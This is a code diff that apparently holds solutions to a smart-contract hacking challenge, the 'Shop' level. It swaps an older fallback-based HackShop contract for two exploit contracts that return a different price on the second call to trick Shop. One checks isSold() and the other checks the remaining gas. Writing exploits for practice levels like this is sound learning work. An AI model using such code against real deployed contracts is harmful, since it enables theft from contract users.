@@ -19,16 +19,36 @@ contract Shop {
   }
 }
 
-contract HackShop {
-    Shop public constant shop = Shop(0x55111a7DE5e0C79f21d30d610de0589E8CD020D9);
-    bool public flag;
+contract HackShop is Buyer {
+  Shop public shop;
 
-    fallback() external returns(uint) {
-        if (!flag) {
-            flag = true;
-            return 111;
-        } else {
-            return 0;
-        }
-    }
+  function price() external override view returns (uint) {
+    return shop.isSold() ? 0: 100;
+  }
+
+  function buy(address shop_) public {
+    shop = Shop(shop_);
+    shop.buy();
+  }
+}
+
+/** @dev you can hack Shop contract even if `isSold = true` statement is declared last. */
+contract HackShopWithGasleft is Buyer {
+  Shop public shop;
+
+  function price() external override view returns (uint) {
+      uint256 gas = gasleft();
+        // remaining gas after call price() twice is 10379
+        // note that gas can be slightly different depending on compiler version and optimizer settings
+      if(gas < 10380) {
+          return 0;
+      } else {
+          return gas;
+      }
+  }
+
+  function buy(address shop_) public {
+    shop = Shop(shop_);
+    shop.buy();
+  }
 }
